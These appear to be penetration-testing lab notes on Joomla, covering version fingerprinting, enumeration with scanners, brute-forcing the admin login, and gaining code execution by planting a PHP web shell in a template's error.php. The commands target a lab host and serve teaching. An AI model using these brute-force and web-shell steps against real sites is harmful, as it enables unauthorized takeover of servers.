Joomla is also CMS released in 2005 having 7k extenshion and 1k+ templates. Its has 3.5% of CMS market share and 2.5M+ site on internet.
To check joomla versions.
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
    "data": {
        "cms_version": {
            "3.7": 8.5,
            "3.8": 18.84,
            "3.9": 30.28,
            "4.0": 1.52,
            "4.1": 0
        },
        "total": 2776276
    }
```

## Discovery/Footprinting
To check website using Joomla as CMS or not.
```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla

	<meta name="generator" content="Joomla! - Open Source Content Management" />


<SNIP>
```

The `robots.txt` file for a Joomla site will often look like this:
```bash
# If the Joomla site is installed within a folder
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
```

We can also see joomla favicon but not always and also we can use readme.txt to see version.
```bash
 curl -s http://dev.inlanefreight.local/README.txt | head -n 5

1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```

To fingerprint from Js files `media/system/js` directory or browsing to `administrator/manifest/files/joomla.xml`
```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.9.4</version>
  <creationDate>March 2019</creationDate>
  
 <SNIP>
```

file `cache.xml` provide us fill version `plugins/system/cache/cache.xml`

## Enumeration:
Let's try out [droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
clone the repo and install via pip.
`sudo pip3 install droopescan`

```bash
 droopescan scan joomla --url http://dev.inlanefreight.local/

[+] Possible version(s):                                                        
    3.8.10
    3.8.11
    3.8.11-rc
    3.8.12
    3.8.12-rc
```

We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool.
For weak password in joomla we can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.
```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 
admin:admin
```

## RCE:
Login to administrator account and if you see some error navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin and disable it.

t's choose the `error.php` page. We'll add a PHP one-liner to gain code execution.
```
system($_GET['malware']);
```

Upload the file with name malware and access webshell.
```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?malware=id
```
